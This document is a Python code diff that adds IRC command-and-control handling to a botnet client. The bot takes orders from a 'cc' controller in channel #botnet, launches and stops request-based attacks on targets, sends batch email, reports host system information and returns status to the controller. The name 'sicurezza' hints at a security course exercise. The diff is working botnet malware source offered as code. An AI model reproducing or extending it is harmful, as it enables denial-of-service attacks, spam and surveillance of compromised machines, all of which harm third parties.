@@ -1,8 +1,9 @@
 import concurrent
 import socket
+import threading
 from http.server import BaseHTTPRequestHandler, HTTPServer
 from concurrent.futures import ThreadPoolExecutor
-from httpServerRH import HTTPServerRH
+from httpServerRH import HTTPServerRH, stopAttack, batchEmail, execRequest, getSystemInfo, getStatus
 
 
 def sendMessage(s, message):
@@ -13,10 +14,35 @@ def readMessage(s):
     buff = s.recv(2048).decode("UTF-8")
     message = buff.split("\r\n")
     for m in message:
-        if m.strip() != "":
-            print("IRC:",m)
         if m.startswith("PING"):
             sendMessage(s, "PONG :botnet.sicurezza.com")
+        if m.startswith(":cc!cc"):
+            if "PING" in m:
+                sendMessage(s, f"PRIVMSG cc #botnet: PONG")
+                return
+            comando = m[m.index(":#botnet: ")+10::]
+            comando = comando.strip("[]").split("|")
+            match comando[0]:
+                case "get":
+                    target, action = execRequest(comando[1],comando[2])
+                    sendMessage(s, f"PRIVMSG cc #botnet: [info|{target}|{action}]")
+                    return
+                case "stop":
+                    target, action = stopAttack()
+                    sendMessage(s, f"PRIVMSG cc #botnet: [info|{target}|{action}]")
+                    return
+                case "systemInfo":
+                    m = getSystemInfo()
+                    sendMessage(s, f"PRIVMSG cc #botnet: [systemInfo|{m}]")
+                    return
+                case "send":
+                    target, action = batchEmail(comando[1],comando[2],comando[3])
+                    sendMessage(s, f"PRIVMSG cc #botnet: [info|{target}|{action}]")
+                    return
+                case "status":
+                    target, action = getStatus()
+                    sendMessage(s, f"PRIVMSG cc #botnet: [info|{target}|{action}]")
+                    return
 
 
 class Bot:
